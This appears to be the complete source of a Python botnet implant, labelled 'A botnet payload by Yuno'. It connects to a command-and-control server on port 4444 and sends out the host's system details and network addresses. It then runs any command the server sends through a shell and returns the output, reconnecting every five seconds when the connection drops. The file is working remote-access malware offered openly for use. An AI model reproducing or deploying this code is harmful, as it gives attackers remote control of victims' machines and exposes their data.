#!/usr/bin/env python3
import socket
import platform
import subprocess
import json
import time
import netifaces

# C2 server settings (match the backend)
C2_HOST = "127.0.0.1"
C2_PORT = 4444

def get_system_info():
    """Gather system information."""
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.release(),
        "architecture": platform.machine(),
    }
    return info

def get_network_info():
    """Gather network interface information."""
    interfaces = netifaces.interfaces()
    network_info = {}
    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                network_info[iface] = addr.get("addr", "Unknown")
    return network_info

def execute_command(command):
    """Execute a system command and return the output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"

def main():
    while True:
        client_socket = None
        try:
            # Connect to the C2 server
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((C2_HOST, C2_PORT))
            print("[*] Connected to C2 server")

            # Exfiltrate system and network info
            system_info = get_system_info()
            network_info = get_network_info()
            exfil_data = {
                "system": system_info,
                "network": network_info
            }
            client_socket.send(json.dumps(exfil_data).encode('utf-8'))
            print("[*] Exfiltrated data sent to C2 server")

            # Command loop
            while True:
                data = client_socket.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    break
                if data.strip() == "exit":
                    print("[*] Received exit command")
                    client_socket.close()
                    return
                # Execute the command and send back the result
                output = execute_command(data)
                client_socket.send(output.encode('utf-8'))
                print(f"[*] Executed command: {data}")

        except Exception as e:
            print(f"[!] Connection failed: {e}")
            print("[*] Retrying in 5 seconds...")
        finally:
            if client_socket is not None:
                client_socket.close()

if __name__ == "__main__":
    print("=== Bot Payload ===")
    print("A botnet payload by Yuno\n")
    main()